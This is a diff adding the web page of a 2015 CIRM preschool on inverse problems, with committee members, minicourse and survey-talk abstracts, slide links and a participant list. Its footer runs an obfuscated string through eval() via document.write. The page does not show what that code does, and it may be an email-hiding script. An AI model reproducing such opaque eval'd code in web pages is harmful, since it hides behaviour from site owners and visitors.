@@ -1,1 +1,327 @@
 
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+   <title>Inverse Problems at IHP</title>
+   <link type="text/css" rel="stylesheet" href="sss/screen.css" media="screen" />
+   <link type="text/css" rel="stylesheet" href="sss/ie.css" media="screen" />
+   <style type="text/css">
+      img.floatLEFT { float: left; margin: 16px }
+   </style>
+   <script type="text/javascript" src="sss/scripts.js"></script>
+</head>
+<script>
+function toggle(id){
+if (document.getElementById){
+hide = document.getElementById(id);
+if (hide.style.display == "none"){
+hide.style.display = "";
+} else {
+hide.style.display = "none";
+}
+}
+}
+</script>
+
+<body class="home">
+
+<div id="outerwrapper">
+<div id="wrapper">
+<div id="iphead">
+  <h1></h1>
+  <div id="iphead_var"></div>
+</div>
+<div id="main">
+    <div id="col1">
+    <ul>
+    	<li id="home"><a href="ip2015.html">Home</a></li>
+	<li id="home"><a href="ipscient.html">Scientific Issues</a></li>
+	<li id="home"><a href="diaryIHP.html">Schedule</a></li>
+	<li id="home"><a href="ipcirm.html">CIRM preschool</a></li>
+    	<li id="home"><a href="ipconferences/ipconf.html">Conferences</a>
+	<li id="home"><a href="ipcourses/ipcourses.html">Courses</a></li>
+	<li id="home"><a href="ipsemin.html">Seminar</a></li>
+	<li id><a href="IPPoster2015.pdf">Poster</a></li>
+	<li id><a href="http://www.ihp.fr/en/CEB/T2-2015">Registration</a></li>
+    </ul>
+    </div>    
+    
+    <div id="col2">
+    <div id="general">
+       <h2>Summer preschool on Inverse Problems at CIRM</h2>
+       <b>April 13th to 20th</b>
+       <span style="float:right">
+            <a href="http://www.cirm.univ-mrs.fr/index.html/?lang=fr">
+                 <img src="sss/i/logo_CIRM.jpg" title="CIRM" align="/left">
+            </a>
+       </span>
+     <br>
+     <br>
+     The CIRM school will introduce the main problems and questions in the field and will be intended to a general audience, in particular PhD students and postdocs. There will be 3 mini-courses follows and one to two additional expository talks per day. 
+     
+       <h3> Scientific Committee</h3>
+           <ul>  
+            <li> Victor Guillemin (MIT) </li>
+            <li> Hiroshi Isozaki (Tsukuba University) </li>
+            <li> Gilles Lebeau (Universit&eacute; de Nice Sophia Antipolis) </li>
+            <li> Gabriel Paternain (Cambridge University) </li>
+            <li> Steve Zelditch (Northwestern University) </li>
+            <li> Gunther Uhlmann (University of Washington) </li>
+         </ul>
+       <h3>Minicourses</h3>
+           <p align="center">
+           <IMG SRC="ipcirmdoc/IMG_2330.JPG" ALT="Mikko Salo" WIDTH=244 HEIGHT=244>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+           <IMG SRC="ipcirmdoc/IMG_2378.JPG" ALT="Leo Tzou" WIDTH=326 HEIGHT=244>
+           </p>
+           <p>
+           <ul>
+                <li>Alberto Ruiz (Universidad Aut&oacute;noma de Madrid) on inverse scattering and the Calder&oacute;n problem
+                      <br> <a href="ipcirmdoc/RuizLec1.pdf">Lecture 1</a> <a href="ipcirmdoc/RuizLec2.pdf">Lecture 2</a>  <br> <a href="https://www.uam.es/gruposinv/inversos/publicaciones/Inverseproblems.pdf">Link</a> to written notes </li>
+                <li>Mikko Salo (University of Jyv&auml;skyl&auml;) on the geodesic X-ray transform <br>
+                 <i>The geodesic ray transform</i><br>
+                <a onClick='toggle("cache1");'>Abstract</a> 
+   <div id='cache1' style="display: none">
+                This course will focus on the geodesic X-ray transform and related geometric inverse problems. The Euclidean X-ray transform, which encodes the integrals of a function over straight lines, is a classical topic (already going back to J. Radon in 1917) and forms the basis of imaging methods such as X-ray computed tomography. The geodesic X-ray transform encodes the integrals of a function over more general families of curves, such as the geodesics of a Riemannian metric. It has applications in seismic imaging and in geometric inverse problems including the boundary rigidity problem, the inverse conductivity problem posed by Calder n, and inverse spectral problems.
+
+There have been several advances in the study of geodesic X-ray transforms and geometric inverse problems recently, and this course will discuss selected results together with the necessary background. After an overview of known results and applications, we will consider the X-ray transform for Euclidean space, for rotationally symmetric sound speeds, and finally for manifolds that may not have any symmetries.
+</div>
+</li>
+                <li>Steve Zelditch (Northwestern University) on spectral rigidity for analytic domains <br>
+                <i>The inverse spectral problem</i><br>
+                <a onClick='toggle("cache2");'>Abstract</a> 
+   <div id='cache2' style="display: none">
+My mini-course consists of 4 lectures on the
+inverse spectral problem: what properties of a Riemannian
+manifold (possibly with boundary) can be recovered from
+the spectrum of its Laplacian?  The first lecture reviewed
+some of the main results over the last 50 years, and introduced
+the wave invariants and the Poisson formula for the wave trace.
+The second lecture focussed on the Kac problem, Can one
+determine a bounded domain in the plane from its Dirichlet or
+Neumann spectrum? I presented a result of Hezari-Zelditch
+that ellipses are spectrally rigid among smooth domains with
+the symmetries of the ellipse. In the third lecture I went into
+more detail on billiard dynamics for convex plane domains,
+and particularly for the ellipse. I then presented the wave
+trace from the Balian-Bloch viewpoint of layer potentials as
+semi-classical Fourier integral operators quantizing the billiard 
+flow. In the fourth and final lecture I presented a new result
+of Avila-Kaloshin-de Simoi that convex domains C1 close to
+an ellipse of small eccentricity and with rationally integrable billiards
+are ellipses. The Balian-Bloch formula shows if a smooth domain
+has the same eigenvalues as an ellipse of small eccentricity, then
+certain oscillatory integrals over the boundary must agree with those
+of the ellipse.  If the number of bounces is sufficiently large, the
+oscillatory integral is of Melrose-Marvizi type. If the domain is analytic
+then for sufficiently large k, the k-bounce phase must be constant
+and the periodic orbits come in smooth 1-parameter families. It
+appears that the same is true for all k \geq 3, but this is a tricky open
+question. As explained at the end, it would imply that an analytic
+domain C1 close to an ellipse of small eccentricity and isospectral
+to the ellipse must be the ellipse. This result is in some ways stronger
+than the Hezari-Zelditch result because no deformation is assumed.</div>
+<br>
+                <a href="ipcirmdoc/ZelditchLec1.pdf">Lecture 1</a> <a href="ipcirmdoc/ZelditchLec2.pdf">Lecture 2</a> </li>
+           </ul>
+           <h3>Survey talks</h3>
+           <p>
+           We plan to have 5 survey talks in addition to the mini courses. 
+           <ul>
+                <li>Lauri Oksanen (University College London) on the Boundary Control Method<br>
+                <i>On the Boundary Control method</i><br>
+                <a onClick='toggle("cache4");'>Abstract</a> 
+                <div id='cache4' style="display: none">
+This is a survey talk about the Boundary Control method. The method
+originates from the work by Belishev in 1987. He developed the method
+to solve the inverse boundary value problem for the acoustic wave
+equation with an isotropic sound speed. The method has proven to be
+very versatile and it has been applied to various inverse problems for
+hyperbolic partial differential equations. We review recent results
+based on the method and explain how a geometric version of method
+works in the case of the wave equation for the Laplace-Beltrami
+operator on a compact Riemannian manifold with boundary.
+
+Recent work reviewed includes:
+
+S. Liu and L.O. A Lipschitz stable reconstruction formula for
+the inverse problem for the wave equation. Trans. Amer. Math.
+Soc., to appear.
+
+M. Lassas and L.O. Inverse problem for the Riemannian wave
+equation with Dirichlet data and Neumann data on disjoint sets.
+Duke Math. J. 163 (2014), no. 6, 1071-1103.
+</div>
+<li>
+                <li>Samuli Siltanen (University of Helsinki) on reconstruction methods<br>
+                <i>Reconstruction methods for ill-posed inverse problems</i><br>
+                <a onClick='toggle("cache5");'>Abstract</a> 
+                <div id='cache5' style="display: none">
+Inverse problems are about interpreting indirect measurements. They arise as the opposite of direct problems in the following sense. A direct problem has the form 'From object to data,' and an inverse problem has the form 'From data to object.' The most interesting inverse problems are ill-posed. This means that at least one (and often all three) of Hadamard's conditions fail. The conditions are: (1) given data, there should some object producing that data; (2) the object in the previous condition should be unique; (3) the object should depend continuously on the data. In practical inverse problems one needs to overcome ill-posedness using regularization, which gives noise-robust reconstruction methods. In this talk, regularized reconstruction is discussed for both linear and nonlinear forward maps. The prototype examples are X-ray tomography (linear inverse problem) and electrical impedance tomography (nonlinear inverse problem). </div>
+                <a href="ipcirmdoc/Siltanen.pdf">Slides</a>
+                </li>
+                <li>Gunther Uhlmann (University of Washington) on Boundary Rigidity<br>
+                <i>On Boundary Rigidity</i><br>
+                <a onClick='toggle("cache6");'>Abstract</a> 
+                <div id='cache6' style="display: none">
+We will consider the inverse problem of determining the sound speed or index of refraction of a medium by measuring the travel
+times of waves going through the medium. This problem arise in several applications in geophysics and medical imaging among others. 
+
+The problem can be recast as a geometric problem: Can one determine a
+Riemannian metric of a Riemannian metric with boundary by measuring
+the distance function between boundary points? This is the boundary
+rigidity problem. We will also consider the problem of determining
+the metric from the scattering relation, the so-called lens rigidity
+problem. The linearization of these problems involve the integration
+of a tensor along geodesics, similar to the X-ray transform.
+
+We will also describe some recent results, join with Plamen Stefanov
+and Andras Vasy, on the partial data case, where you are making
+measurements on a subset of the boundary.</div>
+                <a href="ipcirmdoc/Uhlmann.pdf">Slides</a>
+</li>
+                <li>Leo Tzou (Stockholm University) on Inverse problems with partial data in dimension two</li>
+                <li>Ting Zhou (MIT) on Cloaking and Invisibility issues<br>
+                <i>On approximate transformation-optics based electromagnetic invisibility</i><br>
+                <a href="ipcirmdoc/ZhouAbstract.pdf">Abstract</a>
+                <a href="ipcirmdoc/Zhou.pdf">Slides</a>
+</li>
+           </ul>
+
+       <h3>Schedule</h3>
+              <a href=CIRMSchedule.html>Schedule</a> of the conference
+           <p> 
+       <h3>Participants</h3>
+           <p> 
+           <ul>
+<li>ALBERTI Giovanni S.</li>  
+
+<li>ANDERSSON Joel</li>  
+
+<li>ARNAIZ V&iacute;ctor</li>  
+
+<li>BELLIS C&eacute;dric</li>  
+
+<li>BOMAN Jan</li>  
+
+<li>BOUGHAMMOURA Ahmed</li>  
+
+<li>BUFFE R&eacute;mi</li>  
+
+<li>CHANG Yifan</li>  
+
+<li>DAUDE Thierry</li>  
+
+<li>DESAI Naeem</li>  
+
+<li>DOS SANTOS FERREIRA David</li>  
+
+<li>FAIFMAN Dmitry</li>  
+
+<li>GOBIN Damien</li>  
+
+<li>GUILLARMOU Colin</li>  
+
+<li>HABERMAN Boaz</li>  
+
+<li>HADFIELD Charles</li>  
+
+<li>HEZARI Hamid</li>  
+
+<li>HUANG Xia</li>  
+
+<li>IMED Feki</li>  
+
+<li>INGREMEAU Maxime</li>  
+
+<li>JIM&Eacute;NEZ-P&Eacute;REZ Hugo</li>  
+
+<li>KIAN Yavar</li>  
+
+<li>LAURENT Camille</li>  
+
+<li>LE ROUSSEAU J&eacute;r&ocirc;me</li>  
+
+<li>LIDMAN BERGQVIST Linus</li>  
+
+<li>MACIA Fabricio</li>  
+
+<li>MAZZUCCHELLI Marco</li>  
+
+<li>MIREN Zubeldia</li>  
+
+<li>OKSANEN Lauri</li>  
+
+<li>OLIVE Marc</li>  
+
+<li>OWIS Ashraf</li>  
+
+<li>POHJOLA Valter</li>  
+
+<li>PONOMAREV Dmitry</li>  
+
+<li>POTENCIANO MACHADO Leyter</li>  
+
+<li>PRUCKNER Raphael</li>  
+
+<li>RACITI Fabio</li>  
+
+<li>RAILO Jesse</li>  
+
+<li>RIVIERE Gabriel</li>  
+
+<li>ROBBIANO Luc</li>  
+
+<li>RUIZ alberto</li>  
+
+<li>SAKSALA Teemu</li>  
+
+<li>SALO Mikko</li>  
+
+<li>SANTACESARIA Matteo</li>  
+
+<li>SILTANEN Samuli</li>  
+
+<li>SOCCORSI Eric</li>  
+
+<li>SOLER POLO Diego</li>  
+
+<li>TAEUFER Matthias</li>  
+
+<li>TAUTENHAHN Martin</li>  
+
+<li>TERZIOGLU Fatma</li>  
+
+<li>TZOU Leo</li>  
+
+<li>UHLMANN Gunther</li>  
+
+<li>WALLEZ Thomas</li>  
+
+<li>ZELDITCH Steve</li>  
+
+<li>ZHOU Ting </li>      
+
+</ul>
+</p>
+   </div>
+   </div>                           
+<div id="footer">
+    <p><span class="left"> <script type="text/javascript" language="javascript">
+<!--
+var f7="";for(var t5=0;t5<474;t5++)f7+=String.fromCharCode(("3}/<%LY>>W#,/D3}/<~QYLW~QXOQMW~QGGE%LGYo1/&+$J#/,*_%}/_,!\"DD>m#HfOYLMw$hhfVUTwV\\ZLV]LY$h[OPZtwOYLM$xCmTHPwS[V!mtYLWSHJLnuwuNrh5htZ\\IZ[YnwooqmK|KZ|||MmtYLWSHJLnu|uNrhhoqh\'hqmTH[44O4mtYLWSHJLnu4uNrh+htZ\\IZ[Ynwooq:[YPUNtMYVT*OHY*VKLnz|oqmJHUYHHZmtYLWSHJLnuHuNrhhoqBhthDBvDq:[YPUNtMYVT*OHY*VKLn|~qyzrv_}xxoqmxCmhfVUTV\\ZLV\\[$h[OPZtOYLM$xCmxCmh%KKZMlivvvv|z@\"TH[Olivvvvvz|\"JUY@Zlivvvvvz|\"MY#uH%mtYLWSHJLnu@uNrh@htZ\\IZ[Ynwoo>J %}/_,!\"]1D~QEIDMMMIRUEGMNNIQUEADMMNIMSEGL5NLEW\"3})D%LE".charCodeAt(t5)-(26+2)+0x3f)%(95)+32);document.write(eval(f7))
+//-->
+</script>
+</span>
+    Last Updated 04/04/15 </p>
+</div>
+
+</div>
+</div>
+</div>
+
+</body>
+</html>
+
+
